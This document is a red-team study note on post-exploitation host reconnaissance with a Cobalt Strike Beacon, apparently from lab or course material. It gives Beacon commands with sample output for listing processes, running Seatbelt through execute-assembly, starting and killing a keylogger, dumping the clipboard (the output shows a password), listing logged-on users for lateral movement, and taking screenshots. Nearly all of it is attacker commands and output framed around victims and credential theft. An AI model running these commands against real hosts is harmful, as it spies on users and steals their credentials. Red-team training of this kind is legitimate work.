# Host Reconnaissance

### Processes

Enumerating processes can shed light to any security solutions or programs that are running on the infected host. This may open the door to possible misconfigurations in software we can exploit.

#### `ps` command

```
beacon> ps

[*] This Beacon PID:    YELLOW 9831  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                                               
 88    4             Registry                                         
 364   4             smss.exe                                         
 1532  4             Memory Compression 
```

### Seatbelt

Seatbelt is a tool written in C# that enumerates the host for us. It checks for security solutions, OS info, AppLocker, LAPS, event logging, firewall rules, and more.

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
```

The `execute-assembly` command will run a local .NET executable as a Beacon post-exploitation job. You may pass arguments to this assembly as if it were run from a Windows command-line interface. This command will also inherit your current token.

### Keylogger

Keyloggers are especially useful for capturing passwords, usernames, and other sensitive information.

```
beacon> keylogger
[+] received keystrokes from *Untitled - Notepad by alice
```

#### Kill Keylogger Job

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 2    0     keystroke logger

beacon> jobkill 2
```

### Clipboard

Like Keyloggers, capturing the victims clipboard can reward us with credentials that are copy / pasted. A CS Beacon's clipboard command does not start a job like keylogger, it just dumps the current clipboard.

```
beacon> clipboard
[*] Tasked beacon to get clipboard contents

Clipboard Data (8 bytes):
P@ssw0rd!
```

### User Sessions

Enumerating currently logged in users on the machine may present us with a good attack path. If there is a user with higher privilege than our current user, we can compromise them and attempt to move laterally.&#x20;

```
beacon> net logons

Logged on users at \\localhost:

DEV\alice
DEV\bob
DEV\PWNBOX$
```

### Screenshots

Taking screenshots of the users desktop can be useful to see what the user is doing. Be careful with this as it may tip off security solutions as it is considerably louder than other enumeration techniques.

